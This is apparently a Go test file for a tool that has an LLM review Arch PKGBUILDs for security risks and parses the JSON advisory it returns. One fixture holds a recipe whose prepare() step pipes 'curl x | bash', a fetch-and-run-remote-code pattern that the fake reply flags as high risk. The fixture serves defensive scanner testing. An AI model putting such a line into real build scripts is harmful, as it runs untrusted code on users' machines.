package llm

import (
	"context"
	"strings"
	"testing"

	"github.com/tmc/langchaingo/llms"
)

// fakeModel implements llms.Model, returning a canned response.
type fakeModel struct {
	reply  string
	gotMsg string
}

func (m *fakeModel) GenerateContent(_ context.Context, messages []llms.MessageContent, _ ...llms.CallOption) (*llms.ContentResponse, error) {
	for _, mc := range messages {
		for _, p := range mc.Parts {
			if tc, ok := p.(llms.TextContent); ok {
				m.gotMsg += tc.Text
			}
		}
	}
	return &llms.ContentResponse{Choices: []*llms.ContentChoice{{Content: m.reply}}}, nil
}

func (m *fakeModel) Call(_ context.Context, _ string, _ ...llms.CallOption) (string, error) {
	return m.reply, nil
}

func TestAdviseParsesPlainJSON(t *testing.T) {
	fm := &fakeModel{reply: `{"risk":"high","summary":"fetches and runs remote code","findings":[{"severity":"high","title":"curl|bash","detail":"prepare() pipes curl into bash"}]}`}
	adv, err := Advise(context.Background(), fm, "pkgname=x\nprepare(){ curl x | bash; }", "")
	if err != nil {
		t.Fatal(err)
	}
	if adv.Risk != "high" || len(adv.Findings) != 1 || adv.Findings[0].Severity != "high" {
		t.Fatalf("advisory = %+v", adv)
	}
	// The PKGBUILD must reach the model.
	if !strings.Contains(fm.gotMsg, "curl x | bash") {
		t.Error("prompt did not include the PKGBUILD body")
	}
}

func TestAdviseStripsFencesAndProse(t *testing.T) {
	fm := &fakeModel{reply: "Here is my review:\n```json\n{\"risk\":\"Low\",\"summary\":\"looks fine\",\"findings\":[]}\n```\nHope that helps!"}
	adv, err := Advise(context.Background(), fm, "pkgname=x", "")
	if err != nil {
		t.Fatal(err)
	}
	if adv.Risk != "low" { // normalized to lowercase
		t.Errorf("risk = %q, want low", adv.Risk)
	}
	if len(adv.Findings) != 0 {
		t.Errorf("findings = %+v, want empty", adv.Findings)
	}
}

func TestAdviseExtractsJSONAmidBraceProse(t *testing.T) {
	// A brace in surrounding prose (e.g. an echoed ${pkgname}) must not derail
	// extraction; the first substring that parses as an object wins.
	fm := &fakeModel{reply: `The recipe uses ${pkgname}, result: {"risk":"low","summary":"ok","findings":[]}`}
	adv, err := Advise(context.Background(), fm, "pkgname=x", "")
	if err != nil {
		t.Fatal(err)
	}
	if adv.Risk != "low" {
		t.Errorf("risk = %q, want low", adv.Risk)
	}
}

func TestAdviseUnknownRisk(t *testing.T) {
	fm := &fakeModel{reply: `{"risk":"catastrophic","summary":"s","findings":[]}`}
	adv, err := Advise(context.Background(), fm, "pkgname=x", "")
	if err != nil {
		t.Fatal(err)
	}
	if adv.Risk != "unknown" {
		t.Errorf("risk = %q, want unknown for an out-of-range value", adv.Risk)
	}
}

func TestAdviseRejectsNonJSON(t *testing.T) {
	fm := &fakeModel{reply: "I cannot help with that."}
	if _, err := Advise(context.Background(), fm, "pkgname=x", ""); err == nil {
		t.Error("a response with no JSON object should error")
	}
}

func TestAdviseEmptyPKGBUILD(t *testing.T) {
	if _, err := Advise(context.Background(), &fakeModel{}, "   ", ""); err == nil {
		t.Error("an empty PKGBUILD should error before calling the model")
	}
}
